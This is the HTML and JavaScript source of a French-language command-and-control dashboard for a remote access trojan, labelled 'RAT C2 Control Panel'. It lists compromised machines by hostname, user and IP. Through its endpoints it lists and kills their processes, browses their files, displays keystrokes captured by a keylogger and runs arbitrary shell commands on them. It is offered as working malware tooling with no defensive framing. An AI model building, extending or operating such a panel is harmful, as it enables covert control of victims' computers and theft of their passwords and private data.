<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÆ RAT C2 Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            padding: 20px;
        }
        
        .container { max-width: 1800px; margin: 0 auto; }
        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        
        .main-grid {
            display: grid;
            grid-template-columns: 350px 1fr;
            gap: 20px;
        }
        
        .card {
            background: rgba(255,255,255,0.95);
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            color: #333;
        }
        
        .card h2 {
            color: #667eea;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 3px solid #667eea;
        }
        
        .client-item {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .client-item:hover {
            transform: translateX(5px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        
        .client-item.selected {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            transform: scale(1.02);
        }
        
        .status-online { color: #10b981; font-weight: bold; }
        .status-offline { color: #ef4444; font-weight: bold; }
        
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        
        .tab-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .tab-btn:hover { background: #764ba2; transform: translateY(-2px); }
        .tab-btn.active {
            background: #f5576c;
            box-shadow: 0 5px 15px rgba(245, 87, 108, 0.4);
        }
        
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        .control-group {
            margin-bottom: 20px;
        }
        
        .control-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #667eea;
        }
        
        .control-group input,
        .control-group select,
        .control-group textarea {
            width: 100%;
            padding: 10px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
        }
        
        .control-group textarea {
            resize: vertical;
            min-height: 100px;
            font-family: 'Courier New', monospace;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: 600;
            transition: all 0.3s ease;
            margin-right: 10px;
            margin-bottom: 10px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        .btn-success { background: linear-gradient(135deg, #10b981 0%, #059669 100%); }
        .btn-danger { background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); }
        
        .output-box {
            background: #1e293b;
            color: #10b981;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 15px;
            white-space: pre-wrap;
        }
        
        .process-item, .file-item {
            background: #f8f9fa;
            padding: 10px;
            margin-bottom: 5px;
            border-radius: 5px;
            border-left: 4px solid #667eea;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .keylog-entry {
            background: #f8f9fa;
            padding: 12px;
            margin-bottom: 10px;
            border-radius: 8px;
            border-left: 4px solid #f59e0b;
        }
        
        .alert {
            padding: 12px 20px;
            border-radius: 8px;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .alert-success {
            background: #d1fae5;
            color: #065f46;
            border-left: 4px solid #10b981;
        }
        
        .alert-error {
            background: #fee2e2;
            color: #991b1b;
            border-left: 4px solid #ef4444;
        }
        
        .alert-info {
            background: #dbeafe;
            color: #1e40af;
            border-left: 4px solid #3b82f6;
        }
        
        .no-client {
            text-align: center;
            padding: 60px 20px;
            color: #6b7280;
            font-size: 1.2em;
        }
        
        .refresh-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            font-size: 1.5em;
            cursor: pointer;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
            transition: all 0.3s ease;
        }
        
        .refresh-btn:hover { transform: scale(1.1) rotate(180deg); }
        
        .server-status {
            text-align: center;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 10px;
            background: rgba(0,0,0,0.2);
        }
        
        .online-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .online-green { background: #10b981; }
        .offline-red { background: #ef4444; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÆ RAT C2 - Control Panel</h1>
        
        <div class="server-status">
            <div id="server-status">Connexion au serveur...</div>
            <div id="server-stats"></div>
        </div>
        
        <div class="main-grid">
            <!-- Sidebar Clients -->
            <div class="card">
                <h2>üë• Clients Connect√©s</h2>
                <div id="clients-list">
                    <div class="no-client">Chargement...</div>
                </div>
            </div>
            
            <!-- Main Control Panel -->
            <div class="card">
                <div id="no-client-msg" class="no-client">
                    ‚¨ÖÔ∏è S√©lectionnez un client pour commencer
                </div>
                
                <div id="client-controls" style="display: none;">
                    <h2 id="client-title">Client: Non s√©lectionn√©</h2>
                    
                    <div class="tabs">
                        <button class="tab-btn active" onclick="showTab('info')">üìä Info Syst√®me</button>
                        <button class="tab-btn" onclick="showTab('processes')">‚öôÔ∏è Processus</button>
                        <button class="tab-btn" onclick="showTab('files')">üìÅ Fichiers</button>
                        <button class="tab-btn" onclick="showTab('keylogger')">‚å®Ô∏è Keylogger</button>
                        <button class="tab-btn" onclick="showTab('shell')">üíª Shell</button>
                    </div>
                    
                    <!-- Tab: Info Syst√®me -->
                    <div id="info-tab" class="tab-content active">
                        <div id="system-info" class="output-box">Chargement des informations...</div>
                    </div>
                    
                    <!-- Tab: Processus -->
                    <div id="processes-tab" class="tab-content">
                        <button class="btn btn-success" onclick="listProcesses()">üìã Lister les processus</button>
                        <button class="btn btn-danger" onclick="killProcessPrompt()">‚ùå Tuer un processus</button>
                        
                        <div id="processes-output"></div>
                    </div>
                    
                    <!-- Tab: Fichiers -->
                    <div id="files-tab" class="tab-content">
                        <div class="control-group">
                            <label>Chemin du r√©pertoire</label>
                            <input type="text" id="dir-path" placeholder="C:\" value="C:\">
                        </div>
                        <button class="btn btn-success" onclick="listDirectory()">üìÇ Lister</button>
                        
                        <div id="files-output"></div>
                    </div>
                    
                    <!-- Tab: Keylogger -->
                    <div id="keylogger-tab" class="tab-content">
                        <button class="btn" onclick="viewKeylogs()">üëÅÔ∏è Voir les Keylogs</button>
                        <button class="btn btn-danger" onclick="clearKeylogs()">üßπ Effacer</button>
                        
                        <div id="keylogs-output"></div>
                    </div>
                    
                    <!-- Tab: Shell -->
                    <div id="shell-tab" class="tab-content">
                        <div class="control-group">
                            <label>Commande Shell</label>
                            <textarea id="shell-cmd" placeholder="dir&#10;ipconfig&#10;whoami"></textarea>
                        </div>
                        <button class="btn btn-success" onclick="executeShell()">‚ñ∂Ô∏è Ex√©cuter</button>
                        
                        <div id="shell-output"></div>
                    </div>
                </div>
            </div>
        </div>
        
        <div id="alerts"></div>
    </div>
    
    <button class="refresh-btn" onclick="loadClients()" title="Actualiser">üîÑ</button>
    
    <script>
        const API_BASE = window.location.origin;
        let selectedClient = null;
        
        window.addEventListener('load', () => {
            console.log('Dashboard loaded, API Base:', API_BASE);
            checkServerStatus();
            loadClients();
            setInterval(loadClients, 5000); // Auto-refresh
            setInterval(checkServerStatus, 10000); // Check server every 10s
        });
        
        async function checkServerStatus() {
            try {
                const response = await fetch(`${API_BASE}/admin/status`);
                if (response.ok) {
                    const data = await response.json();
                    document.getElementById('server-status').innerHTML = `
                        <span class="online-indicator online-green"></span>
                        Serveur en ligne - Clients: ${data.online_clients}/${data.total_clients} connect√©s
                    `;
                    document.getElementById('server-stats').innerHTML = `
                        Uptime: ${Math.floor(data.uptime_seconds / 3600)}h ${Math.floor((data.uptime_seconds % 3600) / 60)}m
                    `;
                }
            } catch (error) {
                document.getElementById('server-status').innerHTML = `
                    <span class="online-indicator offline-red"></span>
                    Serveur hors ligne
                `;
            }
        }
        
        function showAlert(message, type = 'info') {
            const alerts = document.getElementById('alerts');
            const alert = document.createElement('div');
            alert.className = `alert alert-${type}`;
            alert.textContent = message;
            alerts.appendChild(alert);
            setTimeout(() => alert.remove(), 5000);
        }
        
        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(tabName + '-tab').classList.add('active');
            event.target.classList.add('active');
        }
        
        async function loadClients() {
            try {
                console.log('Fetching clients from:', `${API_BASE}/admin/clients`);
                const response = await fetch(`${API_BASE}/admin/clients`);
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                
                const data = await response.json();
                console.log('Clients response:', data);
                
                const list = document.getElementById('clients-list');
                
                if (data.status === 'success' && data.clients && data.clients.length > 0) {
                    list.innerHTML = '';
                    
                    data.clients.forEach(client => {
                        const item = document.createElement('div');
                        item.className = 'client-item';
                        if (selectedClient === client.client_id) {
                            item.classList.add('selected');
                        }
                        
                        const status = client.online ? 
                            '<span class="status-online">‚óè ONLINE</span>' : 
                            '<span class="status-offline">‚óè OFFLINE</span>';
                        
                        // Utilisez les champs corrig√©s du serveur
                        const os = client.os || client.system_info?.platform || 'Unknown';
                        const hostname = client.hostname || client.system_info?.hostname || 'Unknown';
                        const username = client.username || client.system_info?.username || 'Unknown';
                        
                        item.innerHTML = `
                            <div style="font-weight: bold; margin-bottom: 5px;">
                                ${client.client_id} ${status}
                            </div>
                            <div style="font-size: 0.9em; opacity: 0.9;">
                                üñ•Ô∏è ${os}<br>
                                üè† ${hostname}<br>
                                üë§ ${username}<br>
                                üåê ${client.ip || 'N/A'}
                            </div>
                        `;
                        
                        item.onclick = () => selectClient(client);
                        list.appendChild(item);
                    });
                } else {
                    list.innerHTML = '<div class="no-client">Aucun client connect√©</div>';
                }
            } catch (error) {
                console.error('Error loading clients:', error);
                showAlert('Erreur lors du chargement des clients: ' + error.message, 'error');
            }
        }
        
        function selectClient(client) {
            selectedClient = client.client_id;
            
            document.getElementById('no-client-msg').style.display = 'none';
            document.getElementById('client-controls').style.display = 'block';
            document.getElementById('client-title').textContent = `Client: ${client.client_id}`;
            
            // Affiche les informations syst√®me compl√®tes
            const info = document.getElementById('system-info');
            const formattedInfo = {
                "ID": client.client_id,
                "Status": client.online ? "Online" : "Offline",
                "IP Address": client.ip || "Unknown",
                "Hostname": client.hostname || client.system_info?.hostname || "Unknown",
                "Username": client.username || client.system_info?.username || "Unknown",
                "Platform": client.os || client.system_info?.platform || "Unknown",
                "Last Seen": new Date(client.last_seen * 1000).toLocaleString(),
                "Check-in Count": client.checkin_count,
                "Uptime": Math.floor(client.uptime_seconds / 3600) + "h " + Math.floor((client.uptime_seconds % 3600) / 60) + "m"
            };
            
            info.textContent = JSON.stringify(formattedInfo, null, 2);
            
            loadClients(); // Refresh selection
            showAlert(`Client s√©lectionn√©: ${client.client_id}`, 'success');
        }
        
        async function listProcesses() {
            if (!selectedClient) {
                showAlert('Aucun client s√©lectionn√©', 'error');
                return;
            }
            
            try {
                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({action: 'list', data: {}})
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showAlert('Commande envoy√©e! Attente du r√©sultat...', 'info');
                    
                    // Poll for result
                    const pollInterval = setInterval(async () => {
                        const resultResponse = await fetch(`${API_BASE}/admin/command_result/${result.command_id}`);
                        const resultData = await resultResponse.json();
                        
                        if (resultData.success && resultData.result) {
                            clearInterval(pollInterval);
                            displayProcesses(resultData.result);
                        }
                    }, 2000);
                    
                    // Timeout after 30 seconds
                    setTimeout(() => {
                        clearInterval(pollInterval);
                        showAlert('Timeout: Aucune r√©ponse du client', 'error');
                    }, 30000);
                }
            } catch (error) {
                showAlert('Erreur: ' + error.message, 'error');
            }
        }
        
        function displayProcesses(result) {
            const output = document.getElementById('processes-output');
            output.innerHTML = '';
            
            if (Array.isArray(result)) {
                output.innerHTML = '<h3 style="color: #667eea; margin-top: 20px;">Liste des processus</h3>';
                
                result.slice(0, 20).forEach(proc => {
                    const item = document.createElement('div');
                    item.className = 'process-item';
                    item.innerHTML = `
                        <div>
                            <strong>${proc.name || 'Unknown'}</strong><br>
                            <small>PID: ${proc.pid || 'N/A'} | CPU: ${proc.cpu_percent || 'N/A'}% | Mem: ${proc.memory_percent || 'N/A'}%</small>
                        </div>
                        <button class="btn btn-danger" onclick="killProcess(${proc.pid || 0})">‚ùå Kill</button>
                    `;
                    output.appendChild(item);
                });
                
                if (result.length > 20) {
                    output.innerHTML += `<p style="color: #666; margin-top: 10px;">${result.length - 20} processus suppl√©mentaires...</p>`;
                }
            } else {
                output.innerHTML = `<div class="output-box">${JSON.stringify(result, null, 2)}</div>`;
            }
        }
        
        async function killProcessPrompt() {
            const pid = prompt('Entrez le PID du processus √† tuer:');
            if (pid && pid.match(/^\d+$/)) {
                await killProcess(parseInt(pid));
            }
        }
        
        async function killProcess(pid) {
            if (!selectedClient || !pid) return;
            
            try {
                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({action: 'kill', data: {pid: pid}})
                });
                
                const result = await response.json();
                if (result.success) {
                    showAlert(`Processus ${pid} tu√©!`, 'success');
                    setTimeout(listProcesses, 2000);
                } else {
                    showAlert('√âchec: ' + result.error, 'error');
                }
            } catch (error) {
                showAlert('Erreur: ' + error.message, 'error');
            }
        }
        
        async function listDirectory() {
            if (!selectedClient) {
                showAlert('Aucun client s√©lectionn√©', 'error');
                return;
            }
            
            const path = document.getElementById('dir-path').value;
            
            try {
                const response = await fetch(`${API_BASE}/admin/file/${selectedClient}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({action: 'list', data: {path: path}})
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showAlert('Commande envoy√©e!', 'info');
                    
                    const pollInterval = setInterval(async () => {
                        const resultResponse = await fetch(`${API_BASE}/admin/command_result/${result.command_id}`);
                        const resultData = await resultResponse.json();
                        
                        if (resultData.success && resultData.result) {
                            clearInterval(pollInterval);
                            displayFiles(resultData.result);
                        }
                    }, 2000);
                    
                    setTimeout(() => {
                        clearInterval(pollInterval);
                        showAlert('Timeout: Aucune r√©ponse du client', 'error');
                    }, 30000);
                }
            } catch (error) {
                showAlert('Erreur: ' + error.message, 'error');
            }
        }
        
        function displayFiles(result) {
            const output = document.getElementById('files-output');
            output.innerHTML = '';
            
            if (Array.isArray(result)) {
                output.innerHTML = '<h3 style="color: #667eea; margin-top: 20px;">Fichiers et dossiers</h3>';
                
                result.forEach(file => {
                    const item = document.createElement('div');
                    item.className = 'file-item';
                    const icon = file.type === 'dir' ? 'üìÅ' : 'üìÑ';
                    item.innerHTML = `
                        <div>
                            ${icon} <strong>${file.name || 'Unknown'}</strong><br>
                            <small>Taille: ${file.size || 'N/A'} | Modifi√©: ${file.modified || 'N/A'}</small>
                        </div>
                    `;
                    output.appendChild(item);
                });
            } else {
                output.innerHTML = `<div class="output-box">${JSON.stringify(result, null, 2)}</div>`;
            }
        }
        
        async function viewKeylogs() {
            if (!selectedClient) {
                showAlert('Aucun client s√©lectionn√©', 'error');
                return;
            }
            
            try {
                const response = await fetch(`${API_BASE}/admin/keylogs/${selectedClient}`);
                const data = await response.json();
                
                const output = document.getElementById('keylogs-output');
                output.innerHTML = '';
                
                if (data.success && data.keylogs && data.keylogs.length > 0) {
                    output.innerHTML = '<h3 style="color: #667eea; margin-top: 20px;">Keylogs r√©cents</h3>';
                    
                    data.keylogs.slice(-20).reverse().forEach(log => {
                        const entry = document.createElement('div');
                        entry.className = 'keylog-entry';
                        entry.innerHTML = `
                            <div style="margin: 5px 0; font-family: monospace;">${log.text || 'No text'}</div>
                            <div style="font-size: 0.85em; color: #6b7280;">
                                ‚è∞ ${log.timestamp || 'Unknown time'}
                            </div>
                        `;
                        output.appendChild(entry);
                    });
                    
                    output.innerHTML += `<p style="color: #666; margin-top: 10px;">Total: ${data.total_logs} keylogs</p>`;
                } else {
                    output.innerHTML = '<div class="alert alert-info">Aucun keylog pour ce client</div>';
                }
            } catch (error) {
                showAlert('Erreur: ' + error.message, 'error');
            }
        }
        
        async function clearKeylogs() {
            if (confirm('Effacer tous les keylogs de ce client?')) {
                showAlert('Fonction en d√©veloppement', 'info');
            }
        }
        
        async function executeShell() {
            if (!selectedClient) {
                showAlert('Aucun client s√©lectionn√©', 'error');
                return;
            }
            
            const command = document.getElementById('shell-cmd').value;
            
            if (!command) {
                showAlert('Entrez une commande', 'error');
                return;
            }
            
            try {
                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({action: 'execute', data: {command: command}})
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showAlert('Commande envoy√©e!', 'info');
                    
                    const pollInterval = setInterval(async () => {
                        const resultResponse = await fetch(`${API_BASE}/admin/command_result/${result.command_id}`);
                        const resultData = await resultResponse.json();
                        
                        if (resultData.success && resultData.result) {
                            clearInterval(pollInterval);
                            const output = document.getElementById('shell-output');
                            output.innerHTML = `<div class="output-box">${resultData.result.output || JSON.stringify(resultData.result, null, 2)}</div>`;
                        }
                    }, 2000);
                    
                    setTimeout(() => {
                        clearInterval(pollInterval);
                        showAlert('Timeout: Aucune r√©ponse du client', 'error');
                    }, 30000);
                }
            } catch (error) {
                showAlert('Erreur: ' + error.message, 'error');
            }
        }
    </script>
</body>
</html>